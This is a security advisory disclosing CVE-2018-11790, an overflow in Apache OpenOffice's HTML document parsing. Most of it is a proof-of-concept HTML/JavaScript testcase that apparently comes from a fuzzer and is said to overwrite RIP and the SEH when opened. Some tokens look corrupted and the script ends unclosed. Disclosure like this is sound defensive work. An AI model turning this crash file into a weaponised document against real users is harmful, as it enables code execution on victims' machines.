**Vulnerability Summary**<br>
The following advisory discusses a vulnerability found in Apache OpenOffice. The vulnerability lays inside the part that responsible for parsing documents, which contains has an overflow that let attackers take control over program execution.

**Vendor Response**<br>
“We obtained a CVE number for the vulnerability you reported: CVE-2018-11790.
The release will need to undergo a community vote and it is thus not completely predictable. But, based on experience from recent releases, at the stage we are in it normally takes one month before the release is made public.”

**CVE**<br>
CVE-2018-11790

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
Apache OpenOffice for Windows before version 4.1.6
Vulnerability Details
The vulnerability is in the HTML files processing. When opening a document, OpenOffice does its best to perform format sniffing. It tries to identify format based on the document contents and not on filename extension. Knowing this, attacker can send a victim specially crafted document with any extension, for example, “odt”, “rtf” or “docx”.

**PoC**<br>
When the following Document is opened by OpenOffice, an overflow occurs which let us override RIP and the Structured Exception Handler(SEH).

```HTML
<!-- saved from url=(0014)about:internet -->
<html>
<head>
<style>
</style>
<script>
function jsfuzzer() {
runcount["jsfuzzer"]++; if(runcount["jsfuzzer"] > 2) { return; }
var fuzzervars = {};
SetVariable(fuzzervars, window, 'Window');
SetVariable(fuzzervars, document, 'Document');
SetVariable(fuzzervars, document.body.firstChild, 'Element');
//beginjs
/* newvar{htmlvar00001:HTMLQuoteElement} */ var htmlvar00001 = document.getElementById("htmlvar00001"); //HTMLQuoteElement
/* newvar{htmlvar00002:HTMLStyleElement} */ var htmlvar00002 = document.getElementById("htmlvar00002"); //HTMLStyleElement
/* newvar{htmlvar00003:HTMLMenuElement} */ var htmlvar00003 = document.getElementById("htmlvar00003"); //HTMLMenuElement
/* newvar{htmlvar00004:HTMLTableElement} */ var htmlvar00004 = document.getElementById("htmlvar00004"); //HTMLTableElement
/* newvar{htmlvar00005:HTMLTableSectionElement} */ var htmlvar00005 = document.getElementById("htmlvar00005"); //HTMLTableSectionElement
/* newvar{htmlvar00006:HTMLTableRowElement} */ var htmlvar00006 = document.getElementById("htmlvar00006"); //HTMLTableRowElement
/* newvar{htmlvar00007:HTMLTableCellElement} */ var htmlvar00007 = document.getElementById("htmlvar00007"); //HTMLTableCellElement
/* newvar{htmlvar00008:HTMLTableCellElement} */ var htmlvar00008 = document.getElementById("htmlvar00008"); //HTMLTableCellElement
/* newvar{htmlvar00009:HTMLDataElement} */ var htmlvar00009 = document.getElementById("htmlvar00009"); //HTMLDataElement
/* newvar{htmlvar00010:HTMLTableRowElement} */ var htmlvar00010 = document.getElementById("htmlvar00010"); //HTMLTableRowElement
/* newvar{htmlvar00011:HTMLTableCellElement} */ var htmlvar00011 = document.getElementById("htmlvar00011"); //HTMLTableCellElement
/* newvar{htmlvar00012:HTMLProgressElement} */ var htmlvar00012 = document.getElementById("htmlvar00012"); //HTMLProgressElement
/* newvar{htmlvar00013:HTMLParagraphElement} */ var htmlvar00013 = document.getElementById("htmlvar00013"); //HTMLParagraphElement
/* newvar{htmlvar00014:HTMLLinkElement} */ var htmlvar00014 = document.getElementById("htmlvar00014"); //HTMLLinkElement
/* newvar{htmlvar00015:HTMLMetaElement} */ var htmlvar00015 = document.getElementById("htmlvar00015"); //HTMLMetaElement
/* newvar{htmlvar00016:HTMLShadowElement} */ var htmlvar00016 = document.getElementById("htmlvar00016"); //HTMLShadowElement
/* newvar{htmlvar00017:HTMLTableCellElement} */ var htmlvar00017 = document.getElementById("htmlvar00017"); //HTMLTableCellElement
/* newvar{htmlvar00018:HTMLBRElement} */ var htmlvar00018 = document.getElementById("htmlvar00018"); //HTMLBRElement
/* newvar{htmlvar00019:HTMLDialogElement} */ var htmlvar00019 = document.getElementById("htmlvar00019"); //HTMLDialogElement
/* newvar{htmlvar00020:HTMLTextAreaElement} */ var htmlvar00020 = document.getElementById("htmlvar00020"); //HTMLTextAreaElement
/* newvar{htmlvar00021:HTMLDialogElement} */ var htmlvar00021 = document.getElementById("htmlvar00021"); //HTMLDialogElement
/* newvar{htmlvar00022:HTMLUnknownElement} */ var htmlvar00022 = document.getElementById("htmlvar00022"); //HTMLUnknownElement
/* newvar{htmlvar00023:HTMLFormElement} */ var htmlvar00023 = document.getElementById("htmlvar00023"); //HTMLFormElement
/* newvar{htmlvar00024:HTMLObjectElement} */ var htmlvar00024 = document.getElementById("htmlvar00024"); //HTMLObjectElement
/* newvar{htmlvar00025:HTMLParamElement} */ var htmlvar00025 = document.getElementById("htmlvar00025"); //HTMLParamElement
/* newvar{htmlvar00026:HTMLUnknownElement} */ var htmlvar00026 = document.getElementById("htmlvar00026"); //HTMLUnknownElement
/* newvar{htmlvar00027:HTMLImageElement} */ var htmlvar00027 = document.getElementById("htmlvar00027"); //HTMLImageElement
/* newvar{htmlvar00028:HTMLIFrameElement} */ var htmlvar00028 = document.getElementById("htmlvar00028"); //HTMLIFrameElement
/* newvar{htmlvar00029:HTMLMetaElement} */ var htmlvar00029 = document.getElementById("htmlvar00029"); //HTMLMetaElement
/* newvar{svgvar00001:SVGSVGElement} */ var svgvar00001 = document.getElementById("svgvar00001"); //SVGSVGElement
/* newvar{svgvar00002:SVGDiscardElement} */ var svgvar00002 = document.getElementById("svgvar00002"); //SVGDiscardElement
/* newvar{svgvar00003:SVGDefsElement} */ var svgvar00003 = document.getElementById("svgvar00003"); //SVGDefsElement
/* newvar{svgvar00004:SVGLineElement} */ var svgvar00004 = document.getElementById("svgvar00004"); //SVGLineElement
/* newvar{svgvar00005:SVGDefsElement} */ var svgvar00005 = document.getElementById("svgvar00005"); //SVGDefsElement
/* newvar{svgvar00006:SVGFEMergeElement} */ var svgvar00006 = document.getElementById("svgvar00006"); //SVGFEMergeElement
/* newvar{svgvar00007:SVGFEMergeNodeElement} */ var svgvar00007 = document.getElementById("svgvar00007"); //SVGFEMergeNodeElement
/* newvar{svgvar00008:SVGPathElement} */ var svgvar00008 = document.getElementById("svgvar00008"); //SVGPathElement
/* newvar{svgvar00009:SVGAnimateElement} */ var svgvar00009 = document.getElementById("svgvar00009"); //SVGAnimateElement
/* newvar{svgvar00010:SVGAnimateTransformElement} */ var svgvar00010 = document.getElementById("svgvar00010"); //SVGAnimateTransformElement
/* newvar{svgvar00011:SVGAnimateTransformElement} */ var svgvar00011 = document.getElementById("svgvar00011"); //SVGAnimateTransformElement
/* newvar{svgvar00012:SVGAnimateTransformElement} */ var svgvar00012 = document.getElementById("svgvar00012"); //SVGAnimateTransformElement
/* newvar{svgvar00013:SVGAnimateMotionElement} */ var svgvar00013 = document.getElementById("svgvar00013"); //SVGAnimateMotionElement
/* newvar{svgvar00014:SVGSymbolElement} */ var svgvar00014 = document.getElementById("svgvar00014"); //SVGSymbolElement
/* newvar{htmlvar00030:HTMLFontElement} */ var htmlvar00030 = document.getElementById("htmlvar00030"); //HTMLFontElement
/* newvar{svgvar00015:SVGFEDistantLightElement} */ var svgvar00015 = document.getElementById("svgvar00015"); //SVGFEDistantLightElement
/* newvar{svgvar00016:SVGLinearGradientElement} */ var svgvar00016 = document.getElementById("svgvar00016"); //SVGLinearGradientElement
/* newvar{svgvar00017:SVGFESpotLightElement} */ var svgvar00017 = document.getElementById("svgvar00017"); //SVGFESpotLightElement
/* newvar{svgvar00018:SVGTSpanElement} */ var svgvar00018 = document.getElementById("svgvar00018"); //SVGTSpanElement
/* newvar{svgvar00019:SVGForeignObjectElement} */ var svgvar00019 = document.getElementById("svgvar00019"); //SVGForeignObjectElement
/* newvar{svgvar00020:SVGAnimateElement} */ var svgvar00020 = document.getElementById("svgvar00020"); //SVGAnimateElement
/* newvar{svgvar00021:SVGFEConvolveMatrixElement} */ var svgvar00021 = document.getElementById("svgvar00021"); //SVGFEConvolveMatrixElement
/* newvar{svgvar00022:SVGAnimateElement} */ var svgvar00022 = document.getElementById("svgvar00022"); //SVGAnimateElement
/* newvar{svgvar00023:SVGSetElement} */ var svgvar00023 = document.getElementById("svgvar00023"); //SVGSetElement
/* newvar{svgvar00024:SVGLinearGradientElement} */ var svgvar00024 = document.getElementById("svgvar00024"); //SVGLinearGradientElement
/* newvar{svgvar00025:SVGAnimateTransformElement} */ var svgvar00025 = document.getElementById("svgvar00025"); //SVGAnimateTransformElement
/* newvar{svgvar00026:SVGCursorElement} */ var svgvar00026 = document.getElementById("svgvar00026"); /AAVGCursorElement
/* newvar{svgvar00027:SVGTSpanElement} */ var svgvar00027 = document.getElementById("svgvar00027"); //SVGTSpanElement
/* newvar{htmlvar00031:HTMLDataElement} */ var htmlvar00031 = document.getElementById("htmlvar00031"); //HTMLDataElement
/* newvar{htmlvar00032:HTMLFontElement} */ var htmlvar00032 = document.getElementById("htmlvar00032"); //HTMLFontElement
/* newvar{htmlvar00033:HTMLKeygenElement} */ var htmlvar00033 = document.getElementById("htmlvar00033"); //HTMLKeygenElement
/* newvar{htmlvar00034:HTMLUnknownElement} */ var htmlvar00034 = document.createElement("main"); //HTMLUnknownElement
/* newvar{htmlvar00035:HTMLTableSectionElement} */ var htmlvar00035 = document.createElement("tfoot"); //HTMLTableSectionElement
/* newvar{htmlvar00036:HTMLBRElement} */ var htmlvar00036 = document.createElement("br"); //HTMLBRElement
/* newvar{htmlvar00037:HTMLTrackElement} */ var htmlvar00037 = document.createElement("track"); //HTMLTrackElement
/* newvar{htmlvar00038:HTMLUnknownElement} */ var htmlvar00038 = document.createElement("blockquote"); //HTMLUnknownElement
try { htmlvar00003.setAttribute("onpagehide", "eventhandler2()"); } catch(e) { }
try { svgvar00025.setAttribute("patternTransform", "translate(0 1) scale(-1) skewX(9)"); } catch(e) { }
try { htmlvar00004.setAttribute("scoped", "scoped"); } catch(e) { }
try { htmlvar00019.setAttribute("oninvalid", "eventhandler4()"); } catch(e) { }
try { htmlvar00008.axis = "" + String.fromCharCode(52, 43, 100, 104, 92, 121, 105, 70, 99, 51, 95, 81, 81, 39, 119, 94, 115, 33, 41, 104) + ""; } catch(e) { }
try { /* newvar{var00001:Window} */ var var00001 = window.frames; } catch(e) { }
try { if (!var00001) { var00001 = GetVariable(fuzzervars, 'Window'); } else { SetVariable(var00001, 'Window'); SetVariable(var00001, 'GlobalEventHandlers'); SetVariable(var00001, 'WindowBase64'); SetVariable(var00001, 'WindowEventHandlers'); SetVariable(var00001, 'WindowTimers'); SetVariable(var00001, 'EventTarget');  } } catch(e) { }
try { htmlvar00012.setAttribute("ondragleave", "eventhandler1()"); } catch(e) { }
try { htmlvar00038.setAttribute("onfocus", "eventhandler1()"); } catch(e) { }
try { /* newvar{var00002:long} */ var var00002 = htmlvar00020.rows; } catch(e) { }
try { htmlvar00024.codeType = "image/gif"; } catch(e) { }
try { svgvar00001.setAttribute("radius", "0"); } catch(e) { }
try { /* newvar{var00003:EventHandler} */ var var00003 = var00001.onmessage; } catch(e) { }
try { if (!var00003) { var00003 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00003, 'EventHandler');  } } catch(e) { }
try { htmlvar00034.setAttribute("kind", "chapters"); } catch(e) { }
try { /* newvar{var00005:HTMLAreaElement} */ var var00005 = document.createElement("area"); } catch(e) { }
try { if (!var00005) { var00005 = GetVariable(fuzzervars, 'HTMLAreaElement'); } else { SetVariable(var00005, 'HTMLAreaElement'); SetVariable(var00005, 'HTMLHyperlinkElementUtils'); SetVariable(var00005, 'Element'); SetVariable(var00005, 'GlobalEventHandlers'); SetVariable(var00005, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00004:DOMString} */ var var00004 = var00005.coords; } catch(e) { }
try { /* newvar{var00006:DOMString} */ var var00006 = htmlvar00005.vAlign; } catch(e) { }
try { /* newvar{var00007:SVGAnimatedLengthList} */ var var00007 = svgvar00018.y; } catch(e) { }
try { if (!var00007) { var00007 = GetVariable(fuzzervars, 'SVGAnimatedLengthList'); } else { SetVariable(var00007, 'SVGAnimatedLengthList');  } } catch(e) { }
try { /* newvar{var00008:boolean} */ var var00008 = htmlvar00021.open; } catch(e) { }
try { /* newvar{var00010:eventhandler} */ var var00010 = eventhandler1; } catch(e) { }
try { if (!var00010) { var00010 = GetVariable(fuzzervars, 'eventhandler'); } else { SetVariable(var00010, 'eventhandler');  } } catch(e) { }
try { /* newvar{var00009:ScrollStateCallback} */ var var00009 = var00010; } catch(e) { }
try { if (!var00009) { var00009 = GetVariable(fuzzervars, 'ScrollStateCallback'); } else { SetVariable(var00009, 'ScrollStateCallback');  } } catch(e) { }
try { /* newvar{var00011:NativeScrollBehavior} */ var var00011 = "disable-native-scroll"; } catch(e) { }
try { if (!var00011) { var00011 = GetVariable(fuzzervars, 'NativeScrollBehavior'); } else { SetVariable(var00011, 'NativeScrollBehavior');  } } catch(e) { }
try { svgvar00015.setApplyScroll(var00009,var00011); } catch(e) { }
try { /* newvar{var00012:WindowBase64} */ var var00012 = var00001; } catch(e) { }
try { if (!var00012) { var00012 = GetVariable(fuzzervars, 'WindowBase64'); } else { SetVariable(var00012, 'WindowBase64');  } } catch(e) { }
try { htmlvar00014.rev = "help"; } catch(e) { }
try { /* newvar{var00013:DOMString} */ var var00013 = htmlvar00028.name; } catch(e) { }
try { /* newvar{var00014:sequence_Animation_} */ var var00014 = htmlvar00036.getAnimations(); } catch(e) { }
try { if (!var00014) { var00014 = GetVariable(fuzzervars, 'sequence_Animation_'); } else { SetVariable(var00014, 'sequence_Animation_');  } } catch(e) { }
try { svgvar00009.setAttribute("mask-type", "alpha"); } catch(e) { }
try { svgvar00017.setAttribute("azimuth", "-1"); } catch(e) { }
try { htmlvar00009.setAttribute("rightmargin", "0"); } catch(e) { }
try { htmlvar00033.dir = "ltr"; } catch(e) { }
try { htmlvar00028.ondrag = var00003; } catch(e) { }
try { svgvar00006.setAttribute("alphabetic", "6"); } catch(e) { }
try { /* newvar{var00015:SVGZoomAndPan} */ var var00015 = svgvar00001; } catch(e) { }
try { if (!var00015) { var00015 = GetVariable(fuzzervars, 'SVGZoomAndPan'); } else { SetVariable(var00015, 'SVGZoomAndPan');  } } catch(e) { }
try { svgvar00005.setAttribute("alignment-baseline", "alphabetic"); } catch(e) { }
try { /* newvar{var00016:Element} */ var var00016 = htmlvar00007.insertAdjacentElement("afterBegin",htmlvar00008); } catch(e) { }
try { if (!var00016) { var00016 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00016, 'Element'); SetVariable(var00016, 'GlobalEventHandlers'); SetVariable(var00016, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00018:HTMLMenuItemElement} */ var var00018 = document.createElement("menuitem"); } catch(e) { }
try { if (!var00018) { var00018 = GetVariable(fuzzervars, 'HTMLMenuItemElement'); } else { SetVariable(var00018, 'HTMLMenuItemElement'); SetVariable(var00018, 'Element'); SetVariable(var00018, 'GlobalEventHandlers'); SetVariable(var00018, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00017:boolean} */ var var00017 = var00018.default; } catch(e) { }
try { htmlvar00027.src = "x"; } catch(e) { }
try { htmlvar00003.setAttribute("onwebkitfullscreenerror", "eventhandler1()"); } catch(e) { }
try { htmlvar00004.deleteRow(8); } catch(e) { }
try { /* newvar{var00019:ShadowRoot} */ var var00019 = htmlvar00009.shadowRoot; } catch(e) { }
try { if (!var00019) { var00019 = GetVariable(fuzzervars, 'ShadowRoot'); } else { SetVariable(var00019, 'ShadowRoot'); SetVariable(var00019, 'DocumentOrShadowRoot'); SetVariable(var00019, 'DocumentFragment'); SetVariable(var00019, 'Element'); SetVariable(var00019, 'GlobalEventHandlers'); SetVariable(var00019, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00020:CSSStyleDeclaration} */ var var00020 = svgvar00010.style; } catch(e) { }
try { if (!var00020) { var00020 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00020, 'CSSStyleDeclaration');  } } catch(e) { }
try { /* newvar{var00021:EventListener} */ var var00021 = var00010; } catch(e) { }
try { if (!var00021) { var00021 = GetVariable(fuzzervars, 'EventListener'); } else { SetVariable(var00021, 'EventListener');  } } catch(e) { }
try { svgvar00025.removeEventListener("connect",var00021,false); } catch(e) { }
try { htmlvar00033.setAttribute("open", "true"); } catch(e) { }
try { /* newvar{var00022:HTMLHyperlinkElementUtils} */ var var00022 = var00005; } catch(e) { }
try { if (!var00022) { var00022 = GetVariable(fuzzervars, 'HTMLHyperlinkElementUtils'); } else { SetVariable(var00022, 'HTMLHyperlinkElementUtils');  } } catch(e) { }
try { /* newvar{var00024:ProcessingInstruction} */ var var00024 = document.createProcessingInstruction(String.fromCharCode(72, 72, 64, 80, 47, 108, 105, 69, 88, 86, 105, 109, 103, 73, 46, 91, 68, 49, 74, 112),String.fromCodePoint(115851, 484058, 119614, 998174, 318605, 162565, 1083462, 239635, 807461, 336268, 299229, 537627, 681885, 992423, 681616, 840978, 680389, 598810, 308881, 102498)); } catch(e) { }
try { if (!var00024) { var00024 = GetVariable(fuzzervars, 'ProcessingInstruction'); } else { SetVariable(var00024, 'ProcessingInstruction'); SetVariable(var00024, 'CharacterData'); SetVariaaaa(var00024, 'Element'); SetVariable(var00024, 'GlobalEventHandlers'); SetVariable(var00024, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00023:CharacterData} */ var var00023 = var00024; } catch(e) { }
try { if (!var00023) { var00023 = GetVariable(fuzzervars, 'CharacterData'); } else { SetVariable(var00023, 'CharacterData'); SetVariable(var00023, 'Element'); SetVariable(var00023, 'GlobalEventHandlers'); SetVariable(var00023, 'EventTarget');  } } catch(e) { }
try { var00023.data = "htmlvar00008"; } catch(e) { }
try { var00020.setProperty("shape-outside", "circle(auto)"); } catch(e) { }
try { /* newvar{var00025:CSSStyleDeclaration} */ var var00025 = htmlvar00033.style; } catch(e) { }
try { if (!var00025) { var00025 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00025, 'CSSStyleDeclaration');  } } catch(e) { }
try { freememory(); } catch(e) { }
try { /* newvar{var00026:SVGElement} */ var var00026 = svgvar00026; } catch(e) { }
try { if (!var00026) { var00026 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00026, 'SVGElement'); SetVariable(var00026, 'GlobalEventHandlers'); SetVariable(var00026, 'EventTarget'); SetVariable(var00026, 'GlobalEventHandlers');  } } catch(e) { }
try { var00025.setProperty("stroke-linejoin", "miter"); } catch(e) { }
try { /* newvar{var00027:Event} */ var var00027 = window.event; } catch(e) { }
try { if (!var00027) { var00027 = GetVariable(fuzzervars, 'Event'); } else { SetVariable(var00027, 'Event');  } } catch(e) { }
try { /* newvar{var00028:EventHandler} */ var var00028 = var00001.onanimationiteration; } catch(e) { }
try { if (!var00028) { var00028 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00028, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00029:SVGURIReference} */ var var00029 = svgvar00026; } catch(e) { }
try { if (!var00029) { var00029 = GetVariable(fuzzervars, 'SVGURIReference'); } else { SetVariable(var00029, 'SVGURIReference');  } } catch(e) { }
try { /* newvar{var00030:DOMString} */ var var00030 = document.charset; } catch(e) { }
try { /* newvar{var00031:EventHandler} */ var var00031 = document.onbeforepaste; } catch(e) { }
try { if (!var00031) { var00031 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00031, 'EventHandler');  } } catch(e) { }
try { htmlvar00030.onpointerover = var00031; } catch(e) { }
try { /* newvar{var00032:HTMLTableRowElement} */ var var00032 = htmlvar00004.insertRow(1); } catch(e) { }
try { if (!var00032) { var00032 = GetVariable(fuzzervars, 'HTMLTableRowElement'); } else { SetVariable(var00032, 'HTMLTableRowElement'); SetVariable(var00032, 'Element'); SetVariable(var00032, 'GlobalEventHandlers'); SetVariable(var00032, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00033:HTMLCollection} */ var var00033 = svgvar00007.getElementsByTagNameNS("http://www.w3.org/2000/svg","datalist"); } catch(e) { }
try { if (!var00033) { var00033 = GetVariable(fuzzervars, 'HTMLCollection'); } else { SetVariable(var00033, 'HTMLCollection');  } } catch(e) { }
try { /* newvar{var00034:DOMString} */ var var00034 = svgvar00023.localName; } catch(e) { }
try { /* newvar{var00035:EventHandler} */ var var00035 = window.onunload; } catch(e) { }
try { if (!var00035) { var00035 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00035, 'EventHandler');  } } catch(e) { }
try { htmlvar00012.setAttribute("aria-checked", "mixed"); } catch(e) { }
try { /* newvar{var00036:Range} */ var var00036 = document.caretRangeFromPoint(); } catch(e) { }
try { if (!var00036) { var00036 = GetVariable(fuzzervars, 'Range'); } else { SetVariable(var00036, 'Range');  } } catch(e) { }
try { htmlvar00028.srcdoc = "data:text/html,foo"; } catch(e) { }
try { /* newvar{var00037:Element} */ var var00037 = htmlvar00024[String.fromCharCode(121, 119, 91, 78, 108, 65, 66, 55, 46, 96, 124, 82, 109, 44, 97, 40, 76, 75, 43, 41)]; } catch(e) { }
try { if (!var00037) { var00037 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00037, 'Element'); SetVariable(var00037, 'GlobalEventHandlers'); SetVariable(var00037, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00038:ApplicationCache} */ var var00038 = window.applicationCache; } catch(e) { }
try { if (!var00038) { var00038 = GetVariable(fuzzervars, 'ApplicationCache'); } else { SetVariable(var00038, 'ApplicationCache'); SetVariable(var00038, 'EventTarget');  } } catch(e) { }
try { var00038.onchecking = var00035; } catch(e) { }
try { /* newvar{var00040:SVGFESpecularLightingElement} */ var var00040 = document.createElementNS("http://www.w3.org/2000/svg", "feSpecularLighting"); } catch(e) { }
try { if (!var00040) { var00040 = GetVariable(fuzzervars, 'SVGFESpecularLightingElement'); } else { SetVariable(var00040, 'SVGFESpecularLightingElement'); SetVariable(var00040, 'SVGFilterPrimitiveStandardAttributes'); SetVariable(var00040, 'SVGElement'); SetVariable(var00040, 'GlobalEventHandlers'); SetVariable(var00040, 'EventTarget'); SetVariable(var00040, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00039:SVGAnimatedNumber} */ var var00039 = var00040.specularConstant; } catch(e) { }
try { if (!var00039) { var00039 = GetVariable(fuzzervars, 'SVGAnimatedNumber'); } else { SetVariable(var00039, 'SVGAnimatedNumber');  } } catch(e) { }
try { /* newvar{var00041:DOMTokenList} */ var var00041 = htmlvar00028.sandbox; } catch(e) { }
try { if (!var00041) { var00041 = GetVariable(fuzzervars, 'DOMTokenList'); } else { SetVariable(var00041, 'DOMTokenList');  } } catch(e) { }
try { /* newvar{var00042:DOMString} */ var var00042 = htmlvar00032.size; } catch(e) { }
try { /* newvar{var00043:EventHandler} */ var var00043 = svgvar00018.ontimeupdate; } catch(e) { }
try { if (!var00043) { var00043 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00043, 'EventHandler');  } } catch(e) { }
try { var00025.setProperty("-webkit-box-flex-group", "1"); } catch(e) { }
try { htmlvar00036.clear = "none"; } catch(e) { }
try { /* newvar{var00044:SVGFilterPrimitiveStandardAttributes} */ var var00044 = svgvar00021; } catch(e) { }
try { if (!var00044) { var00044 = GetVariable(fuzzervars, 'SVGFilterPrimitiveStandardAttributes'); } else { SetVariable(var00044, 'SVGFilterPrimitiveStandardAttributes');  } } catch(e) { }
try { document.domain = "1"; } catch(e) { }
try { /* newvar{var00049:VTTCue} */ var var00049 = new VTTCue(0.0909303455638, 0.838082057143, "1"); } catch(e) { }
try { if (!var00049) { var00049 = GetVariable(fuzzervars, 'VTTCue'); } else { SetVariable(var00049, 'VTTCue'); SetVariable(var00049, 'TextTrackCue'); SetVariable(var00049, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00048:TextTrackCue} */ var var00048 = var00049; } catch(e) { }
try { if (!var00048) { var00048 = GetVariable(fuzzervars, 'TextTrackCue'); } else { SetVariable(var00048, 'TextTrackCue'); SetVariable(var00048, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00047:TextTrack} */ var var00047 = var00048.track; } catch(e) { }
try { if (!var00047) { var00047 = GetVariable(fuzzervars, 'TextTrack'); } else { SetVariable(var00047, 'TextTrack'); SetVariable(var00047, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00046:TextTrackCueList} */ var var00046 = var00047.cues; } catch(e) { }
try { if (!var00046) { var00046 = GetVariable(fuzzervars, 'TextTrackCueList'); } else { SetVariable(var00046, 'TextTrackCueList');  } } catch(e) { }
try { /* newvar{var00045:TextTrackCue} */ var var00045 = var00046[74%var00046.length]; } catch(e) { }
try { if (!var00045) { var00045 = GetVariable(fuzzervars, 'TextTrackCue'); } else { SetVariable(var00045, 'TextTrackCue'); SetVariable(var00045, 'EventTarget');  } } catch(e) { }
try { var00045.onenter = var00031; } catch(e) { }
try { htmlvar00034.setAttribute("autoload", "autoload"); } catch(e) { }
try { /* newvar{var00050:long} */ var var00050 = htmlvar00027.width; } catch(e) { }
try { svgvar00026.onbeforepaste = var00035; } catch(e) { }
try { /* newvar{var00051:EventHandler} */ var var00051 = svgvar00019.onsuspend; } catch(e) { }
try { freememory(); } catch(e) { }
try { if (!var00051) { var00051 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00051, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00052:SVGAnimatedInteger} */ var var00052 = svgvar00021.targetX; } catch(e) { }
try { if (!var00052) { var00052 = GetVariable(fuzzervars, 'SVGAnimatedInteger'); } else { SetVariable(var00052, 'SVGAnimatedInteger');  } } catch(e) { }
try { /* newvar{var00053:SVGElement} */ var var00053 = svgvar00002.firstChild; } catch(e) { }
try { if (!var00053) { var00053 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00053, 'SVGElement'); SetVariable(var00053, 'GlobalEventHandlers'); SetVariable(var00053, 'EventTarget'); SetVariable(var00053, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00054:XPathResult} */ var var00054 = document.evaluate("//html",document); } catch(e) { }
try { if (!var00054) { var00054 = GetVariable(fuzzervars, 'XPathResult'); } else { SetVariable(var00054, 'XPathResult');  } } catch(e) { }
try { var00005.translate = false; } catch(e) { }
try { /* newvar{var00055:HTMLCollection} */ var var00055 = svgvar00009.getElementsByTagNameNS("http://www.w3.org/2000/svg","label"); } catch(e) { }
try { if (!var00055) { var00055 = GetVariable(fuzzervars, 'HTMLCollection'); } else { SetVariable(var00055, 'HTMLCollection');  } } catch(e) { }
try { /* newvar{var00056:long} */ var var00056 = svgvar00019.tabIndex; } catch(e) { }
try { /* newvar{var00057:long} */ var var00057 = htmlvar00019.clientTop; } catch(e) { }
try { /* newvar{var00059:WheelEvent} */ var var00059 = document.createEvent("WheelEvent"); } catch(e) { }
try { if (!var00059) { var00059 = GetVariable(fuzzervars, 'WheelEvent'); } else { SetVariable(var00059, 'WheelEvent'); SetVariable(var00059, 'MouseEvent'); SetVariable(var00059, 'UIEvent'); SetVariable(var00059, 'Event');  } } catch(e) { }
try { /* newvar{var00058:MouseEvent} */ var var00058 = var00059; } catch(e) { }
try { if (!var00058) { var00058 = GetVariable(fuzzervars, 'MouseEvent'); } else { SetVariable(var00058, 'MouseEvent'); SetVariable(var00058, 'UIEvent'); SetVariable(var00058, 'Event');  } } catch(e) { }
try { var00058.initMouseEvent("htmlvar00004",true,true,window,-1,0,5,0,1,false,true); } catch(e) { }
try { /* newvar{var00060:CharacterData} */ var var00060 = var00024; } catch(e) { }
try { if (!var00060) { var00060 = GetVariable(fuzzervars, 'CharacterData'); } else { SetVariable(var00060, 'CharacterData'); SetVariable(var00060, 'Element'); SetVariable(var00060, 'GlobalEventHandlers'); SetVariable(var00060, 'EventTarget');  } } catch(e) { }
try { htmlvar00028.marginWidth = "0"; } catch(e) { }
try { /* newvar{var00061:long} */ var var00061 = svgvar00017.clientLeft; } catch(e) { }
try { /* newvar{var00062:DOMString} */ var var00062 = htmlvar00015.scheme; } catch(e) { }
try { svgvar00012.setAttribute("onerror", "var00010"); } catch(e) { }
try { var00025.setProperty("widows", "-1"); } catch(e) { }
try { svgvar00020.setAttribute("patternContentUnits", "objectBoundingBox"); } catch(e) { }
try { var00025.setProperty("animation-name", "anim"); } catch(e) { }
try { /* newvar{var00063:DOMString} */ var var00063 = htmlvar00011.ch; } catch(e) { }
try { /* newvar{var00064:HTMLMarqueeElement} */ var var00064 = document.createElement("marquee"); } catch(e) { }
try { if (!var00064) { var00064 = GetVariable(fuzzervars, 'HTMLMarqueeElement'); } else { SetVariable(var00064, 'HTMLMarqueeElement'); SetVariable(var00064, 'Element'); SetVariable(var00064, 'GlobalEventHandlers'); SetVariable(var00064, 'EventTarget');  } } catch(e) { }
try { var00064.attributeChangedCallback("1","1",String.fromCodePoint(235749, 276109, 634108, 971743, 272911, 479988, 245943, 454205, 791968, 310373, 639137, 554837, 196505, 467775, 381648, 793298, 270666, 857140, 577553, 238278)); } catch(e) { }
try { /* newvar{var00065:Selection} */ var var00065 = var00019.getSelection(); } catch(e) { }
try { if (!var00065) { var00065 = GetVariable(fuzzervars, 'Selection'); } else { SetVariable(var00065, 'Selection');  } } catch(e) { }
try { var00065.collapse(htmlvar00025); } catch(e) { }
try { var00025.setProperty("backdrop-filter", "grayscale(53%)"); } catch(e) { }
try { htmlvar00024.removeAttributeNS("http://www.w3.org/1999/xhtml",htmlvar00024.attributes[9%htmlvar00024.attributes.length].name); } catch(e) { }
try { document.all[94%document.all.length].appendChild(htmlvar00001); } catch(e) { }
try { /* newvar{var00066:Element} */ var var00066 = htmlvar00003.insertBefore(htmlvar00036,htmlvar00003.childNodes[46%htmlvar00003.childNodes.length]); } catch(e) { }
try { if (!var00066) { var00066 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00066, 'Element'); SetVariable(var00066, 'GlobalEventHandlers'); SetVariable(var00066, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00067:boolean} */ var var00067 = document.hasFocus(); } catch(e) { }
